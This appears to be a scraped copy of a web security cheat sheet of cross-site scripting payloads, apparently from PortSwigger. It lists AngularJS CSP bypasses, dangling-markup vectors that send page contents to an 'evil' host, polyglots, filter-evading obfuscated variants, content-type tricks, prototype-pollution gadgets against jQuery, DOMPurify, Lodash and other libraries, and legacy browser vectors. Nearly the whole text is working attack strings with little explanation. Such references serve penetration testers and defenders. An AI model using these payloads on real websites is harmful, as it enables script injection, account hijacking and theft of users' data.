toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
Jump to the code
AngularJS CSP bypasses
Version:

Author:

Length:

Vector:

Copy:

All versions (all browsers) using from

Gareth Heyes (PortSwigger)

91

<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
Jump to the code
All versions (all browsers) shorter using assignment

Gareth Heyes (PortSwigger)

66

<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
Jump to the code
All versions (all browsers) shorter

Gareth Heyes (PortSwigger)

91

<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
Jump to the code
1.2.0 - 1.5.0

Eduardo Vela (Google)

190

<div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div>
Jump to the code
All versions (all browsers) shorter via oncut

Savan Gadhiya (NotSoSecure)

59

<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>
Jump to the code
Scriptless attacks
Dangling markup
Works in Chrome Works in Firefox Works in Safari
Background attribute

<body background="//evil? <table background="//evil? <table><thead background="//evil? <table><tbody background="//evil? <table><tfoot background="//evil? <table><td background="//evil? <table><th background="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Link href stylesheet

<link rel=stylesheet href="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Link href icon

<link rel=icon href="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Meta refresh

<meta http-equiv="refresh" content="0; http://evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Img to pass markup through src attribute

<img src="//evil? <image src="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Video using track element

<video><track default src="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Video using source element and src attribute

<video><source src="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Audio using source element and src attribute

<audio><source src="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Input src

<input type=image src="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Button using formaction

<form><button style="width:100%;height:100%" type=submit formaction="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Input using formaction

<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Form using action

<button form=x style="width:100%;height:100%;"><form id=x action="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Object data

<object data="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Iframe src

<iframe src="//evil?
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Embed src

<embed src="//evil?
Jump to the codeWorks in Firefox Works in Safari
Use textarea to consume markup and post to external site

<form><button formaction=//evil>XSS</button><textarea name=x>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Pass markup data through window.name using form target

<button form=x>XSS</button><form id=x action=//evil target='
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Pass markup data through window.name using base target

<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Pass markup data through window.name using formtarget

<form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Using base href to pass data

<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Using embed window name to pass data from the page

<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Using iframe window name to pass data from the page

<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Using object window name to pass data from the page

<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Using frame window name to pass data from the page

<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
Jump to the codeWorks in Chrome Works in Safari
Overwrite type attribute with image in hidden inputs

<input type=hidden type=image src="//evil?
Jump to the code
Polyglots
Works in Chrome Works in Firefox Works in Safari
Polyglot payload 1

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Polyglot payload 2

javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Polyglot payload 3

javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
Jump to the code
WAF bypass global objects
Works in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: string concatenation (window)

';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: string concatenation (self)

';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: string concatenation (this)

';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: string concatenation (top)

';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: string concatenation (parent)

';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: string concatenation (frames)

';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: string concatenation (globalThis)

';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: comment syntax (window)

';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: comment syntax (self)

';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: comment syntax (this)

';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: comment syntax (top)

';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: comment syntax (parent)

';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: comment syntax (frames)

';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: comment syntax (globalThis)

';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence (window)

';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence (self)

';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence (this)

';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence (top)

';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence (parent)

';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence (frames)

';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence (globalThis)

';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence and base64 encoded string (window)

';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence and base64 encoded string (self)

';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence and base64 encoded string (this)

';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence and base64 encoded string (top)

';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence and base64 encoded string (parent)

';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence and base64 encoded string (frames)

';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: hex escape sequence and base64 encoded string (globalThis)

';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: octal escape sequence (window)

';window['\141\154\145\162\164']('\130\123\123');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: octal escape sequence (self)

';self['\141\154\145\162\164']('\130\123\123');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: octal escape sequence (this)

';this['\141\154\145\162\164']('\130\123\123');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: octal escape sequence (top)

';top['\141\154\145\162\164']('\130\123\123');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: octal escape sequence (parent)

';parent['\141\154\145\162\164']('\130\123\123');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: octal escape sequence (frames)

';frames['\141\154\145\162\164']('\130\123\123');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: octal escape sequence (globalThis)

';globalThis['\141\154\145\162\164']('\130\123\123');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: unicode escape (window)

';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: unicode escape (self)

';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: unicode escape (this)

';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: unicode escape (top)

';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: unicode escape (parent)

';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: unicode escape (frames)

';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: unicode escape (globalThis)

';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: RegExp source property (window)

';window[/al/.source+/ert/.source](/XSS/.source);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: RegExp source property (self)

';self[/al/.source+/ert/.source](/XSS/.source);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: RegExp source property (this)

';this[/al/.source+/ert/.source](/XSS/.source);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: RegExp source property (top)

';top[/al/.source+/ert/.source](/XSS/.source);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: RegExp source property (parent)

';parent[/al/.source+/ert/.source](/XSS/.source);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: RegExp source property (frames)

';frames[/al/.source+/ert/.source](/XSS/.source);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: RegExp source property (globalThis)

';globalThis[/al/.source+/ert/.source](/XSS/.source);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: Hieroglyphy/JSFuck (window)

';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: Hieroglyphy/JSFuck (self)

';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: Hieroglyphy/JSFuck (this)

';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: Hieroglyphy/JSFuck (top)

';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: Hieroglyphy/JSFuck (parent)

';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: Hieroglyphy/JSFuck (frames)

';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS into a JavaScript string: Hieroglyphy/JSFuck (globalThis)

';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
Jump to the code
Content types
This section lists content-types that can be used for XSS with the X-Content-Type-Options: nosniff header active.

Content-Type
text/html
application/xhtml+xml
application/xml
text/xml
image/svg+xml
text/xsl
application/vnd.wap.xhtml+xml
text/rdf
application/rdf+xml
application/mathml+xml
text/vtt
text/cache-manifest
Browsers
Does work in ChromeDoes work in FirefoxDoes work in Safari
Does work in ChromeDoes work in FirefoxDoes work in Safari
Does work in ChromeDoes work in FirefoxDoes work in Safari
Does work in ChromeDoes work in FirefoxDoes work in Safari
Does work in ChromeDoes work in FirefoxDoes work in Safari
Does work in ChromeDoes work in Safari
Does work in FirefoxDoes work in Safari
Does work in Firefox
Does work in Firefox
Does work in Firefox
PoC
<script>alert(document.domain)</script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
<script>alert(document.domain)</script>
<script>alert(document.domain)</script>
Response content types
This section lists content-types that can be used for XSS when you can inject into the content-type header.

Content-Type
text/plain; x=x, text/html, foobar
text/html(xxx
text/html xxx
text/html xxx
text/html, xxx
text/html; xxx
Browsers
Does work in ChromeDoes work in Firefox
Does work in ChromeDoes work in Firefox
Does work in ChromeDoes work in Firefox
Does work in ChromeDoes work in Firefox
Does work in ChromeDoes work in FirefoxDoes work in Safari
Does work in ChromeDoes work in FirefoxDoes work in Safari
PoC
<script>alert(document.domain)</script>
<script>alert(document.domain)</script>
<script>alert(document.domain)</script>
<script>alert(document.domain)</script>
<script>alert(document.domain)</script>
<script>alert(document.domain)</script>
Impossible labs
To find out what these are for, please refer to Documenting the impossible: Unexploitable XSS labs.

Title	Description	Length limit	Closest vector	Link
Basic context, WAF blocks <[a-zA-Z]	This lab captures the scenario when you can't use an open tag followed by an alphanumeric character. Sometimes you can solve this problem by bypassing the WAF entirely, but what about when that's not an option? Certain versions of .NET have this behaviour, and it's only known to be exploitable in old IE with <%tag.	N/A	N/A	🔗
Script based injection but quotes, forward slash and backslash are escaped	We often encounter this situation in the wild: you have an injection inside a JavaScript variable and can inject angle brackets, but quotes and forward/backslashes are escaped so you can't simply close the script block.

The closest we've got to solving this is when you have multiple injection points. The first within a script based context and the second in HTML.	N/A	N/A	🔗
innerHTML context but no equals allowed	You have a site that processes the query string and URL decodes the parameters but splits on the equals then assigns to innerHTML. In this context <script> doesn't work and we can't use = to create an event.	N/A	N/A	🔗
Basic context length limit	This lab's injection occurs within the basic HTML context but has a length limitation of 15. Filedescriptor came up with a vector that could execute JavaScript in 16 characters: <q oncut=alert`` but can you beat it?	15	<q oncut=alert``	🔗
Attribute context length limit	The context of this lab inside an attribute with a length limitation of 14 characters. We came up with a vector that executes JavaScript in 15 characters:"oncut=alert``+ the plus is a trailing space. Do you think you can beat it?	14	"oncut=alert``	🔗
Basic context length limit, arbitrary code	It's all well and good executing JavaScript but if all you can do is call alert what use is that? In this lab we demonstrate the shortest possible way to execute arbitrary code.	19	<q oncut=eval(name)	🔗
Attribute context length limit arbitrary code	Again calling alert proves you can call a function but we created another lab to find the shortest possible attribute based injection with arbitrary JavaScript.	17	See link	🔗
Injection occurs inside a frameset but before the body	We received a request from twitter about this next lab. It occurs within a frameset but before a body tag with equals filtered. You would think you could inject a closing frameset followed by a script block but that would be too easy.	N/A	N/A	🔗
Injection occurs inside single quoted string, only characters a-z0-9+'.` are allowed.	The injection occurs within a single quoted string and the challenge is to execute arbitrary code using the charset a-zA-Z0-9'+.`. Luan Herrera solved this lab in an amazing way, you can view the solution in the following post.	N/A	N/A	🔗
Injection occurs inside double quoted src attribute of a image element	The double quote is encoded, the challenge is to find a way to execute XSS within a quoted src attribute.	N/A	N/A	🔗
Prototype pollution
Library	Payload	Author	Version	Fingerprint
Wistia Embedded Video	<script>
Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';
</script>	William Bowling	All versions	return (typeof wistiaEmbeds !== 'undefined')
$(x).off jQuery	<script>
Object.prototype.preventDefault='x';
Object.prototype.handleObj='x';
Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';
/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');
</script>	Sergey Bobrov	All versions	return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')
$(html) jQuery	<script>
Object.prototype.div=['1','<img src onerror=alert(1)>','1']
</script><script>
$('<div x="x"></div>')
</script>	Sergey Bobrov	All versions	return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')
$.get jQuery	<script>
Object.prototype.url = ['data:,alert(1)//'];
Object.prototype.dataType = 'script';
</script>
<script>
$.get('https://google.com/');
$.post('https://google.com/');
</script>	Michał Bentkowski	>= 3.0.0	return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')
$.getScript jQuery	<script>
Object.prototype.src = ['data:,alert(1)//']
</script>
<script>
$.getScript('https://google.com/')
</script>	s1r1us	>= 3.4.0	return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')
$.getScript jQuery	<script>
Object.prototype.url = 'data:,alert(1)//'
</script>
<script>
$.getScript('https://google.com/')
</script>	s1r1us	3.0.0 - 3.3.1	return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')
Google reCAPTCHA	<script>
Object.prototype.srcdoc=['<script>alert(1)<\/script>']
</script>
<div class="g-recaptcha" data-sitekey="your-site-key"/>	s1r1us		return (typeof recaptcha !== 'undefined')
Twitter Universal Website Tag	<script>
Object.prototype.hif = ['javascript:alert(document.domain)'];
</script>	Sergey Bobrov		return (typeof twq !== 'undefined' && typeof twq.version !== 'undefined')
Tealium Universal Tag	<script>
Object.prototype.attrs = {src:1};
Object.prototype.src='https://portswigger-labs.net/xss/xss.js'
</script>	Sergey Bobrov		return (typeof utag !== 'undefined' && typeof utag.id !== 'undefined')
Akamai Boomerang	<script>Object.prototype.BOOMR = 1;
Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>	s1r1us		return (typeof BOOMR !== 'undefined')
Lodash	<script>
Object.prototype.sourceURL = '\u2028\u2029alert(1)'
</script>
<script>
_.template('test')
</script>	Alex Brasetvik	<= 4.17.15	return (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined')
sanitize-html	<script>
Object.prototype['*'] = ['onload']</script>
<script>
document.write(sanitizeHtml('<iframe onload=alert(1)>'))
</script>	Michał Bentkowski		return (typeof sanitizeHtml !== 'undefined')
js-xss	<script>
Object.prototype.whiteList = {img: ['onerror', 'src']}
</script>
<script>
document.write(filterXSS('<img src onerror=alert(1)>'))
</script>	Michał Bentkowski		return (typeof filterXSS !== 'undefined')
DOMPurify	<script>
Object.prototype.ALLOWED_ATTR = ['onerror', 'src']
</script>
<script>
document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))
</script>	Michał Bentkowski	<= 2.0.12	return (typeof DOMPurify !== 'undefined')
DOMPurify	<script>
Object.prototype.documentMode = 9
</script>	Michał Bentkowski	<= 2.0.12	return (typeof DOMPurify !== 'undefined')
Closure	<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>	Michał Bentkowski		return (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined')
Closure	<script>
Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';
</script>	Michał Bentkowski		return (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined')
Marionette.js / Backbone.js	<script>
Object.prototype.tagName = 'img'
Object.prototype.src = ['x:x']
Object.prototype.onerror = ['alert(1)']
</script>
<script>
(function() {
var View = Mn.View.extend({template: '#template-layout'});
var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});
var app = new App();
app.start();
})();
</script>
<div id="template-layout" type="x-template/underscore">xxx</div>	Sergey Bobrov		return (typeof Marionette !== 'undefined') return (typeof Backbone !== 'undefined' && typeof Backbone.VERSION !== 'undefined')
Adobe Dynamic Tag Management	<script>
Object.prototype.src='data:,alert(1)//'
</script>	Sergey Bobrov		return (typeof _satellite !== 'undefined')
Embedly Cards	<script>
Object.prototype.onload = 'alert(1)'
</script>	Guilherme Keerok		return (typeof window.embedly !== 'undefined')
Segment Analytics.js	<script>
Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']
</script>	Sergey Bobrov		return (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined')
Knockout.js	<strong data-bind="text:'hello'"></strong>
<script>
Object.prototype[4]="a':1,[alert(1)]:1,'b";Object.prototype[5]=',';
</script><script>
ko.applyBindings({})
</script>	Michał Bentkowski		
Classic vectors (XSS crypt)
Image src with JavaScript protocol

<img src="javascript:alert(1)">
Jump to the code
Body background with JavaScript protocol

<body background="javascript:alert(1)">
Jump to the code
Iframe data urls no longer work as modern browsers use a null origin

<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">
Jump to the code
VBScript protocol used to work in IE

<a href="vbscript:MsgBox+1">XSS</a> <a href="#" onclick="vbs:Msgbox+1">XSS</a> <a href="#" onclick="VBS:Msgbox+1">XSS</a> <a href="#" onclick="vbscript:Msgbox+1">XSS</a> <a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a> <a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>
Jump to the code
JScript compact was a minimal version of JS that wasn't widely used in IE

<a href="#" onclick="jscript.compact:alert(1);">test</a> <a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>
Jump to the code
JScript.Encode allows encoded JavaScript

<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a> <a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
Jump to the code
VBScript.Encoded allows encoded VBScript

<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@> <iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
Jump to the code
JavaScript entities used to work in Netscape Navigator

<a title="&{alert(1)}">XSS</a>
Jump to the code
JavaScript stylesheets used to be supported by Netscape Navigator

<link href="xss.js" rel=stylesheet type="text/javascript">
Jump to the code
Button used to consume markup

<form><button name=x formaction=x><b>stealme
Jump to the code
IE9 select elements and plaintext used to consume markup

<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>
Jump to the code
XBL Firefox only <= 2

<div style="-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"> <div style="\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"> <div style="-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"> <div style="-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)">
Jump to the code
XBL also worked in FF3.5 using data urls

<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" />
Jump to the code
CSS expressions <=IE7

